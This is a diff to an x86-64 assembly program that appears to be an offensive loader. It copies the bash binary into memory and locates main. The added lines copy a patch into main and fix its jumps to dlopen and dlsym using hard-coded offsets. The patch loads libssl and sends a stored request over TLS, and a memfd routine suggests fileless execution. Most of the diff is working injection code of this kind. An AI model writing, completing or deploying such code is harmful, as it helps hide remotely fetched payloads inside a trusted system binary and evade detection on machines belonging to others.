@@ -95,6 +95,8 @@ BITS 64
 ; rsp - points the buffer we are using to start the copy of bash.
 ; r12 - length of the bash binary
 ; r13 - offset to main
+; r14 - offset to dlopen
+; r15 - offset to dlsym
 
 _start:
     push rbp
@@ -121,19 +123,41 @@ _discover_main:
     mov r13, rax
     add rax, rsp
     add rax, main_offset
-    ; so rax is now a signed 32bit int.
+; so rax is now a signed 32bit int.
     mov rax, [rax]
     cdqe
     add r13, rax
     add r13, main_rip_offset
-    jmp _inf
 
 _find_rela:
-
+; using known offsets.
+    mov r14, 0x14c9f8
+    mov r15, 0x14cc90
 
 _apply_patches:
-    ; memcpy the _patch in
-    ; set the dlopen and dlsym jumps
+; memcpy the _patch in
+    mov rcx, _patch_end - _patch_start
+    lea rsi, [rel _patch_start]
+    mov rdi, rsp
+    add rdi, r13
+    rep movsb
+; set the dlopen and dlsym jumps
+
+; start off with getting the offset to main in our buffer
+    mov rdx, r13
+    add rdx, rsp
+
+    mov rax, r13
+    add rax, 9
+    sub r14, rax
+    mov [rdx + _dlopen_target - _patch_start], r14d
+
+    mov rax, r13
+    add rax, 16
+    sub r15, rax
+    mov [rdx + _dlsym_target - _patch_start], r15d
+
+    ; jmp _inf
 
 _setup_memfd:
     xor rsi, rsi
@@ -175,8 +199,8 @@ _str_null:
 ; r14 - libssl handle
 ; r15 - sbio / scratch
 
-_patch:
-    jmp _patch_start
+_patch_start:
+    jmp _patch_code
 
 ; these are the opcodes for bnd jmp
 _dlopen:
@@ -189,7 +213,7 @@ _dlsym:
 _dlsym_target:
     dd 0x41434344
 
-_patch_start:
+_patch_code:
 ; just need to push one value, but we'll overwrite the stack that was allocated
 ; before us.
     push rbp
@@ -234,7 +258,7 @@ read_twice:
     mov rsi, rsp
     mov rdi, r15
     mov rax, r13
-    ; assuming rdi doesn't have the top bit set, else this fails!
+; assuming rdi doesn't have the top bit set, else this fails!
     mov rdx, rdi
     call rax
     
@@ -293,3 +317,5 @@ _str_req:
     db 0x0a
     db 0x0a
     db 0
+
+_patch_end:
